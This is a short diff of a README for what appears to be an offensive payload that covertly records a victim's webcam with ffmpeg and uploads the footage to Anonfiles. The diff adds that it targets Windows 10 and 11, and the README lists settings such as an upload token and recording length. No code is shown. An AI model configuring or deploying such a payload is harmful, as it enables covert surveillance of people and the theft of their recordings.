@@ -2,6 +2,8 @@
 
 This payload records the users Webcam video at 1280x720 using ffmpeg and uploads the recording to Anonfiles 
 
+**It targets Windows 10, 11**
+
 You must edit the following parameters on the payload:
 * anontoken - your AnonfilesToken
 * RecordTime - Length, in seconds, of each recording
